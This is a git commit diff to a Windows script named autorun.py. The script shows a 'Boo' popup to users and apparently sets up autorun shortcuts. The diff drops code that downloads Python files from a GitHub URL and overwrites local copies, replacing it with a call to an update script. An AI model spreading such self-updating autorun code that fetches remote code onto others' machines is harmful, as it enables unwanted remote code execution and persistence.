0f1a1a27ae6aeba9addc4dd6ab7373a440d86a62
Juliasmatius <80146546+Juliasmatius@users.noreply.github.com>
2022-12-26 14:15:31 +0200

    Made it actually update the darn thing

--- autorun.py
+++ autorun.py
@@ -3,9 +3,4 @@ os.system("msg * Boo")
 import requests
 import winshell
 from win32com.client import Dispatch
-url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/main.py'
-r = requests.get(url, allow_redirects=True)
-open('c:/julinjutut/main.py', 'wb').write(r.content)
-url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/autorun.py'
-r = requests.get(url, allow_redirects=True)
-open('c:/julinjutut/autorun.py', 'wb').write(r.content)
+os.system("python3 c:/julinjutut/update.py")
